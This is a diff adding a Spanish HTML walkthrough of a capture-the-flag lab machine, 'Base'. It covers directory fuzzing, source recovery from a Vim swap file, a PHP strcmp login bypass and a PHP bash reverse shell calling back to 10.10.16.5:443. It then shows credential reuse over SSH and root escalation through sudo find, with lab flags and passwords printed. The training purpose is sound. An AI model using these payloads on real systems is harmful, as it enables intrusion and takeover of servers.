+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ¿POR QUÉ EXPORTAR A XML?</p>
+        <p>El formato XML de nmap es procesable por herramientas externas. Con <strong>xsltproc</strong> obtenemos un HTML navegable, mientras que otras herramientas como <strong>nmaptocsv</strong> o <strong>Metasploit</strong> pueden importar directamente el XML para correlacionar vulnerabilidades con los servicios descubiertos.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ENUMERACIÓN WEB -->
+    <div class="section" id="enumeracion">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Enumeración Web</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">RECONOCIMIENTO MANUAL DEL SITIO WEB</span>
+      </div>
+      <div class="prose">
+        <p>
+          Al acceder a <span class="hl-cyan">http://10.129.5.82</span> encontramos una página de
+          presentación de un servicio de <strong>hosting de archivos</strong> llamado "Base". La
+          página tiene secciones de marketing: Cloud Storage, Supporting All Files, Maximizing
+          Availability y Always Protecting. También vemos un menú con un botón de
+          <span class="hl-yel">Login</span>. Sin embargo, no hay información sensible visible en
+          la superficie, así que procedemos a enumerar directorios y archivos ocultos.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">FUZZING DE DIRECTORIOS CON GOBUSTER</span>
+      </div>
+      <div class="prose">
+        <p>
+          <span class="hl-cyan">Gobuster</span> es una herramienta de fuerza bruta para descubrimiento
+          de directorios y archivos web. Usa un <strong>wordlist</strong> (lista de palabras) y prueba
+          cada entrada como ruta del servidor, registrando los códigos de respuesta HTTP. Usamos el
+          wordlist <span class="hl-yel">big.txt</span> de dirb, que contiene miles de nombres comunes
+          de directorios y archivos, y añadimos la extensión <span class="hl-cyan">php</span> para
+          descubrir también archivos PHP. Esto nos permite mapear la superficie de ataque del servidor.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="gobuster dir -u http://10.129.5.82 -w /usr/share/wordlists/dirb/big.txt -t 10 -x php">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">ENUMERACIÓN</span>
+        <div><span class="prompt">$ </span><span class="cmd">gobuster <span class="arg">dir</span> <span class="flag">-u</span> <span class="arg">http://10.129.5.82</span> <span class="flag">-w</span> <span class="arg">/usr/share/wordlists/dirb/big.txt</span> <span class="flag">-t</span> <span class="arg">10</span> <span class="flag">-x</span> <span class="arg">php</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Gobuster v3.8.2 — by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</div>
+        <div>[+] Url:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; http://10.129.5.82</div>
+        <div>[+] Method:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GET</div>
+        <div>[+] Threads:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10</div>
+        <div>[+] Wordlist:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /usr/share/wordlists/dirb/big.txt</div>
+        <div>[+] Negative Status codes: 404</div>
+        <div>[+] Extensions:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; php</div>
+        <div>&nbsp;</div>
+        <div><span class="o-yellow">.htaccess&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span> (Status: 403) [Size: 276]</div>
+        <div><span class="o-yellow">.htaccess.php&nbsp;&nbsp;&nbsp;</span> (Status: 403) [Size: 276]</div>
+        <div><span class="o-green">_uploaded&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span> (Status: 301) [Size: 314] [--&gt; http://10.129.5.82/_uploaded/]</div>
+        <div><span class="o-green">assets&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span> (Status: 301) [Size: 311] [--&gt; http://10.129.5.82/assets/]</div>
+        <div><span class="o-green">forms&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span> (Status: 301) [Size: 310] [--&gt; http://10.129.5.82/forms/]</div>
+        <div><span class="o-green">login&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span> (Status: 301) [Size: 310] [--&gt; http://10.129.5.82/login/]</div>
+        <div><span class="o-cyan">logout.php&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span> (Status: 302) [Size: 0] [--&gt; /login.php]</div>
+        <div><span class="o-yellow">server-status&nbsp;&nbsp;&nbsp;</span> (Status: 403) [Size: 276]</div>
+        <div><span class="o-cyan">upload.php&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span> (Status: 302) [Size: 0] [--&gt; /login/login.php]</div>
+        <div>&nbsp;</div>
+        <div>Progress: 40938 / 40938 (100.00%) — Finished</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// HALLAZGOS CLAVE</p>
+        <p>Encontramos varios directorios y archivos interesantes: <strong>/login</strong> (panel de autenticación), <strong>/_uploaded</strong> (directorio donde se guardan los archivos subidos), <strong>upload.php</strong> (redirige al login → confirma que hay funcionalidad de carga de archivos) y <strong>logout.php</strong>. El directorio <strong>/login</strong> es el vector de entrada principal.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- DIRECTORY LISTING -->
+    <div class="section" id="dirlisting">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Directory Listing → Código Fuente Expuesto</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">DIRECTORIO /LOGIN CON LISTING HABILITADO</span>
+      </div>
+      <div class="prose">
+        <p>
+          Al navegar a <span class="hl-cyan">http://10.129.5.82/login/</span> encontramos que
+          Apache tiene el <strong>directory listing habilitado</strong>: en lugar de mostrar
+          un error 403 o redirigir, Apache nos muestra el <strong>listado completo de archivos</strong>
+          del directorio. Esto ocurre porque no existe un archivo <code style="color:var(--yellow);font-family:var(--font-mono)">index</code>
+          en esa carpeta y la opción <code style="color:var(--yellow);font-family:var(--font-mono)">Options +Indexes</code>
+          está habilitada en la configuración de Apache. Es una mala configuración gravísima en producción.
+        </p>
+        <p>
+          Los archivos listados son: <span class="hl-cyan">config.php</span>,
+          <span class="hl-cyan">login.php</span> y un archivo que nos llama especialmente la
+          atención: <span class="hl-red">login.php.swp</span>. Este es un
+          <strong>archivo swap de Vim</strong> — un archivo temporal que Vim genera automáticamente
+          cuando se está editando un archivo. Contiene una copia del <strong>código fuente</strong>
+          del archivo en edición, en este caso, del propio <code style="color:var(--yellow);font-family:var(--font-mono)">login.php</code>.
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-cyan">Index of /login</span></div>
+        <div>&nbsp;</div>
+        <div>Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Last modified&nbsp;&nbsp; Size&nbsp; Description</div>
+        <div>──────────────────────────────────────────────────────</div>
+        <div>Parent Directory&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -</div>
+        <div><span class="o-yellow">config.php</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2022-06-04 16:24&nbsp; 61</div>
+        <div><span class="o-yellow">login.php</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2022-06-15 11:23&nbsp; 7.4K</div>
+        <div><span class="o-red">login.php.swp</span>&nbsp;&nbsp; 2022-06-04 17:09&nbsp; 16K</div>
+        <div>&nbsp;</div>
+        <div>Apache/2.4.29 (Ubuntu) Server at 10.129.5.82 Port 80</div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// ARCHIVO SWAP DE VIM</p>
+        <p>Cuando Vim edita un archivo, crea automáticamente un archivo swap con extensión <strong>.swp</strong> en el mismo directorio. Si el editor se cierra inesperadamente (crash, cierre de sesión SSH), el swap no se elimina y queda en disco. En un servidor web con directory listing habilitado, cualquier visitante puede descargarlo y recuperar el código fuente del archivo original. Para recuperar el contenido: <strong>vim -r login.php.swp</strong> o simplemente <strong>strings login.php.swp</strong>.</p>
+      </div>
+
+      <div class="prose">
+        <p>
+          Descargamos el archivo swap y recuperamos el código fuente del login. La parte crítica
+          es la función de autenticación, que usa <span class="hl-red">strcmp()</span> para
+          comparar la contraseña enviada con la almacenada:
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="strings login.php.swp">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">ANÁLISIS</span>
+        <div><span class="prompt">$ </span><span class="cmd">strings <span class="arg">login.php.swp</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-cyan">&lt;?php</span></div>
+        <div>session_start();</div>
+        <div>if (!empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) {</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;require('config.php');</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;<span class="o-red">if (strcmp($username, $_POST['username']) == 0</span></div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;&amp; <span class="o-red">strcmp($password, $_POST['password']) == 0</span>) {</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_SESSION['user'] = $username;</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header("Location: /upload.php");</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;} else {</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print("&lt;script&gt;alert('Wrong Username or Password')&lt;/script&gt;");</div>
+        <div>&nbsp;&nbsp;&nbsp;&nbsp;}</div>
+        <div>}</div>
+        <div><span class="o-cyan">?&gt;</span></div>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// VULNERABILIDAD: PHP TYPE JUGGLING CON STRCMP()</p>
+        <p>La función <strong>strcmp($a, $b)</strong> retorna 0 cuando los strings son iguales, un número negativo si $a &lt; $b, y positivo si $a &gt; $b. El problema: en PHP, cuando se pasa un <strong>array</strong> en lugar de un string a strcmp(), la función retorna <strong>NULL</strong>. Y NULL comparado con == 0 es <strong>TRUE</strong> en PHP (comparación loose). Enviando <strong>password[]= </strong> (array vacío), strcmp() retorna NULL, NULL == 0 es TRUE, y el login se acepta sin verificar la contraseña real.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- AUTH BYPASS -->
+    <div class="section" id="bypass">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Auth Bypass — PHP Type Juggling</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">CAPTURA Y MODIFICACIÓN DE LA PETICIÓN CON BURP SUITE</span>
+      </div>
+      <div class="prose">
+        <p>
+          Sabiendo que la vulnerabilidad está en el uso de <span class="hl-red">strcmp()</span>
+          con comparación laxa, necesitamos <strong>interceptar la petición HTTP</strong> del
+          formulario de login y modificar el parámetro <code style="color:var(--yellow);font-family:var(--font-mono)">password</code>
+          para convertirlo en un array. Usamos <span class="hl-cyan">Burp Suite</span> como
+          proxy interceptor: configuramos el navegador para que pase todo el tráfico HTTP a través
+          de Burp, activamos el interceptor, y enviamos el formulario con cualquier credencial.
+        </p>
+        <p>
+          Burp captura la petición POST antes de que llegue al servidor. Podemos editarla y
+          reenviarla (<strong>Forward</strong>). El truco es cambiar el parámetro de
+          <code style="color:var(--yellow);font-family:var(--font-mono)">password=cualquier_cosa</code>
+          a <code style="color:var(--red);font-family:var(--font-mono)">password[]=</code>,
+          que es la sintaxis PHP para enviar un array vacío en un formulario. Con el usuario
+          <span class="hl">admin</span> y este array como contraseña, el <span class="hl-red">strcmp()</span>
+          retornará NULL y el login nos dará acceso.
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-cyan">POST /login/login.php HTTP/1.1</span></div>
+        <div>Host: 10.129.5.82</div>
+        <div>Content-Type: application/x-www-form-urlencoded</div>
+        <div>Cookie: PHPSESSID=28s213ms18f7ifnii65eeb37ir</div>
+        <div>&nbsp;</div>
+        <div><span class="o-red">username=admin&amp;password[]=</span>&nbsp;&nbsp;<span class="o-yellow">← parámetro modificado a array vacío</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// RESULTADO DEL BYPASS</p>
+        <p>Al enviar la petición modificada, el servidor responde con una redirección a <strong>/upload.php</strong> y nos establece una sesión autenticada como administrador. Accedemos al panel <strong>Admin File Uploads</strong> donde podemos subir archivos al servidor sin restricciones visibles.</p>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item">
+          <div class="cred-label">USUARIO</div>
+          <div class="cred-val">admin</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">CONTRASEÑA</div>
+          <div class="cred-val">password[]= (array vacío)</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">TÉCNICA</div>
+          <div class="cred-val">PHP Type Juggling · strcmp() bypass</div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- FILE UPLOAD -->
+    <div class="section" id="upload">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">File Upload — Webshell PHP</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">CREACIÓN DE LA REVERSE SHELL PHP</span>
+      </div>
+      <div class="prose">
+        <p>
+          Una vez dentro del panel de administración, vemos que podemos subir archivos al servidor.
+          El servidor corre PHP (confirmado por los archivos .php encontrados con Gobuster), lo que
+          significa que si logramos subir un archivo <span class="hl-red">.php</span> malicioso,
+          el servidor lo <strong>ejecutará</strong> cuando lo solicitemos. A esto se le llama
+          <span class="hl-red">Remote Code Execution (RCE)</span> mediante File Upload.
+        </p>
+        <p>
+          Creamos un archivo PHP de una línea que ejecuta una
+          <span class="hl-red">bash reverse shell</span>: cuando el servidor la ejecute,
+          establecerá una conexión TCP de vuelta a nuestra máquina (<span class="hl-cyan">10.10.16.5</span>)
+          en el <strong>puerto 443</strong> (usamos 443 porque es HTTPS, puerto que raramente
+          está bloqueado por firewalls de salida). El comando <code style="color:var(--yellow);font-family:var(--font-mono)">bash -i</code>
+          inicia bash en modo interactivo, y <code style="color:var(--yellow);font-family:var(--font-mono)">&gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code>
+          redirige stdin/stdout/stderr a través de la conexión TCP.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="echo '<?php exec(&quot;/bin/bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.10.16.5/443 0&gt;&amp;1&apos;&quot;);?>' > xp.php">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">WEBSHELL</span>
+        <div><span class="prompt">$ </span><span class="cmd">cat <span class="arg">xp.php</span></span></div>
+        <div>&nbsp;</div>
+        <div><span class="flag">&lt;?php</span></div>
+        <div>&nbsp;&nbsp;exec(<span class="arg">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/<span class="o-red">10.10.16.5</span>/443 0&gt;&amp;1'"</span>);</div>
+        <div><span class="flag">?&gt;</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">SUBIDA DEL ARCHIVO Y VERIFICACIÓN EN /_UPLOADED</span>
+      </div>
+      <div class="prose">
+        <p>
+          Subimos el archivo <span class="hl-cyan">xp.php</span> a través del panel de
+          administración. El servidor no valida el tipo de archivo ni la extensión: acepta
+          cualquier archivo, incluyendo scripts PHP ejecutables. Una vez subido, verificamos
+          que aparezca en el directorio <span class="hl-yel">/_uploaded</span> (que también
+          tiene directory listing habilitado, exponiéndonos el contenido del directorio):
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-cyan">Index of /_uploaded</span></div>
+        <div>&nbsp;</div>
+        <div>Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Last modified&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Size</div>
+        <div>──────────────────────────────────────────────</div>
+        <div>Parent Directory&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -</div>
+        <div><span class="o-yellow">script.php</span>&nbsp;&nbsp;&nbsp; 2026-05-08 03:30&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 32</div>
+        <div><span class="o-green">xp.php</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2026-05-08 04:38&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 32</div>
+        <div>&nbsp;</div>
+        <div>Apache/2.4.29 (Ubuntu) Server at 10.129.5.82 Port 80</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ¿POR QUÉ FUNCIONA EL UPLOAD?</p>
+        <p>El panel de upload no implementa ninguna validación del tipo MIME real ni de la extensión del archivo. Solo verifica si el campo de formulario tiene contenido. Esto permite subir cualquier archivo, incluyendo scripts PHP. La segunda mala configuración: <strong>Apache sirve el directorio _uploaded con permisos de ejecución de PHP</strong>, por lo que al hacer GET al archivo .php, el servidor lo ejecuta en lugar de descargarlo.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REVERSE SHELL -->
+    <div class="section" id="shell">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Reverse Shell — Acceso Inicial como www-data</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">LISTENER NETCAT + TRIGGER DE LA SHELL</span>
+      </div>
+      <div class="prose">
+        <p>
+          Antes de acceder al archivo PHP subido, necesitamos tener un
+          <strong>listener activo</strong> en nuestra máquina. Usamos <span class="hl-cyan">netcat</span>
+          (<code style="color:var(--yellow);font-family:var(--font-mono)">nc</code>) en modo escucha
+          sobre el <strong>puerto 443</strong>. Cuando el servidor ejecute nuestro script PHP,
+          intentará conectarse a nuestra IP en ese puerto; si el listener está activo, la conexión
+          se establece y obtenemos la shell.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="nc -lvnp 443">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">LISTENER</span>
+        <div><span class="prompt">$ </span><span class="cmd">nc <span class="flag">-lvnp</span> <span class="arg">443</span></span></div>
+      </div>
+
+      <div class="prose">
+        <p>
+          Con el listener activo, accedemos desde el navegador a
+          <span class="hl-cyan">http://10.129.5.82/_uploaded/xp.php</span>. El servidor
+          ejecuta el script PHP, que a su vez ejecuta la instrucción bash que redirige
+          la conexión a nuestra máquina. El listener recibe la conexión:
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-yellow">listening on [any] 443 ...</span></div>
+        <div><span class="o-green">connect to [10.10.16.5] from (UNKNOWN) [10.129.5.82] 56908</span></div>
+        <div>bash: cannot set terminal process group (1243): Inappropriate ioctl for device</div>
+        <div>bash: no job control in this shell</div>
+        <div><span class="o-cyan">www-data@base:/var/www/html/_uploaded$</span> whoami</div>
+        <div><span class="o-green">www-data</span></div>
+        <div><span class="o-cyan">www-data@base:/var/www/html/_uploaded$</span> ls</div>
+        <div>script.php</div>
+        <div>shell.php</div>
+        <div>xp.php</div>
+        <div><span class="o-cyan">www-data@base:/var/www/html/_uploaded$</span> cd ..</div>
+        <div><span class="o-cyan">www-data@base:/var/www/html$</span> ls</div>
+        <div>_uploaded  assets  forms  index.html  login  logout.php  upload.php</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// SHELL COMO WWW-DATA</p>
+        <p>Tenemos ejecución de código en el servidor como el usuario <strong>www-data</strong>, que es el usuario con el que Apache sirve contenido web en Ubuntu. Este usuario tiene acceso de lectura a los archivos del servidor web, lo cual es suficiente para leer el archivo <strong>config.php</strong> que contiene las credenciales.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- CREDENCIALES Y SSH -->
+    <div class="section" id="creds">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Credenciales en Texto Plano → SSH como John</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">10</div>
+        <span class="step-title">LECTURA DE CONFIG.PHP — CREDENCIALES EXPUESTAS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Desde nuestra shell como <span class="hl">www-data</span>, navegamos al directorio
+          <span class="hl-cyan">/var/www/html/login</span> donde encontramos los archivos del
+          panel de login. El archivo <span class="hl-yel">config.php</span> es el que incluye
+          el login con las credenciales de la base de datos de usuarios. Hacemos
+          <code style="color:var(--yellow);font-family:var(--font-mono)">cat config.php</code>
+          para leer su contenido:
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="cat /var/www/html/login/config.php">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">POST-EXPLOT</span>
+        <div><span class="prompt">www-data@base:/var/www/html$</span></div>
+        <div><span class="prompt">$ </span><span class="cmd">cd <span class="arg">login</span> &amp;&amp; cat <span class="arg">config.php</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-cyan">&lt;?php</span></div>
+        <div><span class="o-yellow">$username</span> = <span class="o-green">"admin"</span>;</div>
+        <div><span class="o-yellow">$password</span> = <span class="o-red">"thisisagoodpassword"</span>;</div>
+        <div><span class="o-cyan">?&gt;</span></div>
+      </div>
+
+      <div class="prose">
+        <p>
+          Las credenciales están almacenadas en <strong>texto plano</strong> sin ningún tipo
+          de hash ni cifrado. Ahora navegamos al directorio <code style="color:var(--yellow);font-family:var(--font-mono)">/home</code>
+          para identificar los usuarios del sistema y comprobamos si estas credenciales funcionan
+          para alguno de ellos por SSH (<strong>reutilización de contraseñas</strong>):
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="cd /home && ls">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">ENUM LOCAL</span>
+        <div><span class="prompt">$ </span><span class="cmd">cd <span class="arg">/home</span> &amp;&amp; ls</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">john</span></div>
+        <div><span class="o-cyan">www-data@base:/home$</span> cd john &amp;&amp; ls</div>
+        <div><span class="o-yellow">user.txt</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">11</div>
+        <span class="step-title">ACCESO SSH COMO JOHN</span>
+      </div>
+      <div class="prose">
+        <p>
+          Existe un usuario <span class="hl">john</span> con su directorio home. Intentamos
+          conectarnos por SSH usando como contraseña la que encontramos en
+          <span class="hl-yel">config.php</span>. La reutilización de contraseñas es un
+          error común: los desarrolladores usan la misma contraseña para el sistema y para
+          las credenciales hardcodeadas en la aplicación.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ssh john@10.129.5.82">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SSH</span>
+        <div><span class="prompt">$ </span><span class="cmd">ssh <span class="arg">john@10.129.5.82</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>john@10.129.5.82's password: <span class="o-red">thisisagoodpassword</span></div>
+        <div>&nbsp;</div>
+        <div>Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-151-generic x86_64)</div>
+        <div>&nbsp;</div>
+        <div>System load:&nbsp; 1.07&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Processes:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 108</div>
+        <div>Usage of /:&nbsp;&nbsp; 64.1% of 2.83GB&nbsp; Users logged in:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0</div>
+        <div>Memory usage: 19%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IP address for ens160: 10.129.5.82</div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">john@base:~$</span> cat user.txt</div>
+        <div><span class="o-yellow">f54846c258f3b4612f78a819573d158e</span></div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item">
+          <div class="cred-label">USUARIO</div>
+          <div class="cred-val">john</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">CONTRASEÑA</div>
+          <div class="cred-val">thisisagoodpassword</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">FUENTE</div>
+          <div class="cred-val">/login/config.php (texto plano)</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">FLAG</div>
+          <div class="cred-val">user.txt ✓</div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- PRIVESC -->
+    <div class="section" id="privesc">
+      <p class="section-label">// 09</p>
+      <h2 class="section-title">Escalada de Privilegios — sudo /usr/bin/find</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">12</div>
+        <span class="step-title">ENUMERACIÓN DE PERMISOS SUDO</span>
+      </div>
+      <div class="prose">
+        <p>
+          El primer paso en cualquier escalada de privilegios en Linux es revisar qué comandos
+          puede ejecutar el usuario actual con <span class="hl-cyan">sudo</span> sin necesitar
+          contraseña de root. Lo hacemos con <code style="color:var(--yellow);font-family:var(--font-mono)">sudo -l</code>.
+          Este comando consulta el archivo <code style="color:var(--yellow);font-family:var(--font-mono)">/etc/sudoers</code>
+          y lista los permisos configurados para el usuario actual.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo -l">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PRIVESC</span>
+        <div><span class="prompt">john@base:~$ </span><span class="cmd">sudo <span class="flag">-l</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[sudo] password for john: <span class="o-red">thisisagoodpassword</span></div>
+        <div>Matching Defaults entries for john on base:</div>
+        <div>&nbsp;&nbsp;&nbsp; env_reset, mail_badpass, secure_path=/usr/local/sbin:...</div>
+        <div>&nbsp;</div>
+        <div>User john may run the following commands on base:</div>
+        <div>&nbsp;&nbsp;&nbsp; (root : root) <span class="o-red">/usr/bin/find</span></div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// MISCONFIGURACION CRÍTICA</p>
+        <p>El usuario <strong>john</strong> puede ejecutar <strong>/usr/bin/find</strong> como root mediante sudo. <strong>find</strong> tiene la capacidad de ejecutar comandos arbitrarios con la flag <code>-exec</code>, lo que significa que al correrlo con sudo, podemos ejecutar cualquier comando como root. GTFOBins documenta exactamente cómo abusar de esto.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">13</div>
+        <span class="step-title">EXPLOTACIÓN CON GTFOBINS → SHELL COMO ROOT</span>
+      </div>
+      <div class="prose">
+        <p>
+          <span class="hl-cyan">GTFOBins</span> (gtfobins.github.io) es un repositorio de
+          referencia que documenta cómo binarios Unix estándar pueden ser abusados para escalar
+          privilegios. Para <code style="color:var(--yellow);font-family:var(--font-mono)">find</code>
+          con sudo, el comando es simple: usamos <code style="color:var(--yellow);font-family:var(--font-mono)">-exec</code>
+          para ejecutar <code style="color:var(--yellow);font-family:var(--font-mono)">/bin/sh</code>
+          y <code style="color:var(--yellow);font-family:var(--font-mono)">-quit</code> para
+          que find se detenga después del primer resultado (para que no busque más archivos).
+          Como sudo ejecuta find como root, la shell que abrimos también es <span class="hl-red">root</span>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo /usr/bin/find . -exec /bin/sh \; -quit">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PRIVESC ROOT</span>
+        <div><span class="prompt">john@base:~$ </span><span class="cmd">sudo <span class="arg">/usr/bin/find</span> <span class="arg">.</span> <span class="flag">-exec</span> <span class="arg">/bin/sh</span> <span class="arg">\;</span> <span class="flag">-quit</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-prompt"># </span>whoami</div>
+        <div><span class="o-red">root</span></div>
+        <div><span class="o-prompt"># </span>cd /root &amp;&amp; ls</div>
+        <div><span class="o-yellow">root.txt</span></div>
+        <div><span class="o-prompt"># </span>cat root.txt</div>
+        <div><span class="o-green">51709519ea18ab37dd6fc58096bea949</span></div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item">
+          <div class="cred-label">VECTOR</div>
+          <div class="cred-val">sudo /usr/bin/find</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">TÉCNICA</div>
